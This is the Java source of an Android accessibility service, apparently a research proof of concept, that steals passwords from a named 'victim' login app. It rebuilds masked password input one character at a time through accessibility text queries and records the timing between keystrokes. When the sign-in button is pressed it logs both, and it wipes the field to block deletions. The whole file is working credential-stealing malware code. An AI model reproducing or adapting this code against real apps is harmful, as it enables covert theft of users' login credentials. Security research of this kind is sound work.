package com.example.conquer;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Bundle;
import android.util.Log;
import android.view.Gravity;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class Conquer extends AccessibilityService {
    String pwd = "";
    public static String victim = "com.example.logindemo";
    long last_len = 0;
    ArrayList<Integer> interval = new ArrayList<>();
    long cur_time;
    long last_time;
    /**********************************
     * active query related variables *
     **********************************/
    boolean do_active_query = false;
    boolean active_query_started = false;
    // "com.example.logindemo:id/password_defense" for the demo
    public static String target_view_id = "com.example.logindemo:id/password_defense";
    /********************************
     * lazy query related variables *
     ********************************/
    boolean do_lazy_query = false;
    // "pwd" for the demo
    public static String content_description = "pwd";
    ArrayList<String> non_content_description_strs = new ArrayList<>();
    ArrayList<String> content_description_strs = new ArrayList<>();
    long num_ignored_char = 0;
    boolean be_lazy = true;

    final char[] allChars = {
            ' ', '!', '\"', '#', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', '$',
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
            ':', ';', '<', '=', '>', '?', '@',
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
            '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~'
    };
    final String[] allStrs = {
            " ", "!", "\"", "#", "%", "&", "\'", "(", ")", "*", "+", ",", "-", ".", "/", "$",
            "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
            ":", ";", "<", "=", ">", "?", "@",
            "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
            "[", "\\", "]", "^", "_", "`", "{", "|", "}", "~"
    };

    public void start_listen() {
        class ActiveQueryThread extends Thread {
            AccessibilityNodeInfo pwdnode = null;
            int len = 0;
            String pwd = "";

            public void locatePwdNode() {
                AccessibilityNodeInfo a = getRootInActiveWindow();
                if (a == null) {
                    return;
                }

                List<AccessibilityNodeInfo> b = null;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR2) {
                    b = a.findAccessibilityNodeInfosByViewId(Conquer.target_view_id);
                } else {
                    return;
                }

                if (b.size() == 0) {
                    return;
                }

                pwdnode = b.get(0);
            }

            public void doQuery() {
                for (char c : allChars) {
                    String tmp = pwd + c;
                    if (pwdnode.findAccessibilityNodeInfosByText(tmp).size() > 0) {
                        pwd = tmp;
                        Log.i("demo", "current password is: " + pwd);
                        len += 1;
                        break;
                    }
                }
            }

            @Override
            public void run() {

                while (true) {
                    locatePwdNode();
                    if (pwdnode == null) {
                        continue;
                    }
                    try {
                        String tmp = pwdnode.getText().toString();
                        if (tmp.equals("密码")) {
                            continue;
                        } else {
                            if (tmp.length() > len) {
                                doQuery();
                            }
                        }
                    } catch (Exception e) {

                    }
                }
            }
        }

        ActiveQueryThread t = new ActiveQueryThread();
        t.start();
    }

    public void commonLogic(AccessibilityNodeInfo node) {
        for (char c : allChars) {
            String tmp = pwd + c;
            if (node.findAccessibilityNodeInfosByText(tmp).size() > 0) {
                last_len += 1;
                pwd = tmp;
                if (last_len != 1) {
                    long diff = cur_time - last_time;
                    interval.add((int) diff);
                }
                last_time = cur_time;
                break;
            }
        }
    }

    public void lazy_query(AccessibilityNodeInfo node) {
        for (String c : non_content_description_strs) {
            if (node.findAccessibilityNodeInfosByText(c).size() > 0) {
                // the first match
                last_len += 1;
                if (last_len != 1) {
                    long diff = cur_time - last_time;
                    interval.add((int) diff);
                }
                last_time = cur_time;
                be_lazy = false;
                pwd = c;
                for (long i = 0; i < num_ignored_char; ++i) {
                    for (String s : content_description_strs) {
                        String tmp = s + pwd;
                        if (node.findAccessibilityNodeInfosByText(tmp).size() > 0) {
                            pwd = tmp;
                            break;
                        }
                    }
                }
                Log.i("demo", "lazy query succeeds!");
                num_ignored_char = 0;
                return;
            }
        }
        // else, let it go
        last_len += 1;
        if (last_len != 1) {
            long diff = cur_time - last_time;
            interval.add((int) diff);
        }
        last_time = cur_time;
        num_ignored_char += 1;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String pkg_name = null;

        try {
            pkg_name = event.getPackageName().toString();
        } catch (Exception e) {
            return;
        }

        AccessibilityNodeInfo node = event.getSource();

        if (node == null) {
            return;
        }

        if (!pkg_name.equals(victim)) {
            return;
        }

        if (do_active_query) {
            if (!active_query_started) {
                active_query_started = true;
                start_listen();
                return;
            } else {
                return;
            }
        }

        int event_type = event.getEventType();
        if (event_type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED && node.isPassword()) {
            if (node.getText() == null) {
                return;
            }
            int cur_len = node.getText().length();
            if (cur_len == last_len + 1) {
                cur_time = System.currentTimeMillis();
                if (do_lazy_query && be_lazy) {
                    lazy_query(node);
                }  else {
                    commonLogic(node);
                }
            } else if (cur_len < last_len) {
                Bundle args = new Bundle();
                args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, "");
                node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                last_len = 0;
                pwd = "";
                interval = new ArrayList<>();
                Toast t = Toast.makeText(getApplicationContext(), "deletion not supported", Toast.LENGTH_LONG);
                t.setGravity(Gravity.TOP, 0, 0);
                t.show();
            }
        } else if (event_type == AccessibilityEvent.TYPE_VIEW_CLICKED &&
                node.getClassName().toString().endsWith("Button") &&
                node.getText().equals("SIGN IN OR REGISTER")) {
            Log.i("demo", "your password is: " + pwd);
            Log.i("demo", "Time interval: " + interval.toString());
            pwd = "";
            last_len = 0;
            interval = new ArrayList<>();
        }
    }

    @Override
    public void onInterrupt() {

    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = getServiceInfo();
        info.packageNames = new String[]{victim};
        setServiceInfo(info);
        String lowercase_content_description = content_description.toLowerCase();
        if (do_lazy_query) {
            for (String c : allStrs) {
                if (!lowercase_content_description.contains(c)) {
                    non_content_description_strs.add(c);
                } else {
                    content_description_strs.add(c);
                }
            }
        }
    }
}
